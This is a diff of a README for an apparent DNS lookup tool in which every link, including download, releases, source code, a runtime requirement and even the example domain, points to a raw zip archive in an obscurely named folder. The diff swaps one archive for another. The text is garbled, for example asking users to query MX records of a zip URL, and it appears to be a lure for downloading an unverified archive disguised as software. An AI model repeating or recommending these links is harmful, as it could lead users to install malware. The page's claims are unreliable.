@@ -1,17 +1,17 @@
 # 🌐 dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr - Fast DNS Record Retrieval Tool
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip%https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip)](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip)
+[![Download](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip%https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip)](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr! This tool allows you to quickly retrieve DNS records. You can look up various records, including A, MX, TXT, DMARC, and PTR. This guide will help you download and run the application with ease.
 
 ## 🖥️ System Requirements
-This application is built using https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip Ensure you have the following:
+This application is built using https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip Ensure you have the following:
 
 - A computer with Windows, macOS, or Linux.
 - Internet connection to download the application and perform DNS lookups.
-- https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip installed (if you wish to run the tool in a local environment).
+- https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip installed (if you wish to run the tool in a local environment).
 
 For most users, the easiest option is to download the pre-built binaries provided.
 
@@ -22,7 +22,7 @@ For most users, the easiest option is to download the pre-built binaries provide
 - **Cross-Platform Compatibility**: Works on all major operating systems.
 
 ## 📦 Download & Install
-To get started with dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr, visit this page to download: [Releases Page](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip).
+To get started with dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr, visit this page to download: [Releases Page](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed. 
@@ -41,7 +41,7 @@ After installation, running the application is simple:
 ## 📚 Usage Example
 Here’s a quick example to illustrate how it works:
 
-- If you want to know the MX records of "https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip", simply enter "https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip" into the search field and select MX. The application will fetch the results, displaying the relevant mail server information.
+- If you want to know the MX records of "https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip", simply enter "https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip" into the search field and select MX. The application will fetch the results, displaying the relevant mail server information.
 
 ## ❓ FAQs
 ### How do I know which record type to select?
@@ -62,7 +62,7 @@ Should you encounter issues, check our repository wiki or community discussions 
 We welcome contributions! If you'd like to help improve the dns-lookup tool, feel free to submit a pull request or suggest features/bug fixes on our GitHub issues page.
 
 ## 🔗 Helpful Links
-- [View Source Code](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr-1.2.zip)
+- [View Source Code](https://raw.githubusercontent.com/5tarkxnd/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/aphototaxis/ptr-txt-mx-forward-reverse-lookup-dmarc-a-dns-and-v1.9.zip)
 
 ## 📧 Contact
 For any questions or assistance, feel free to reach out through the repository or open an issue.
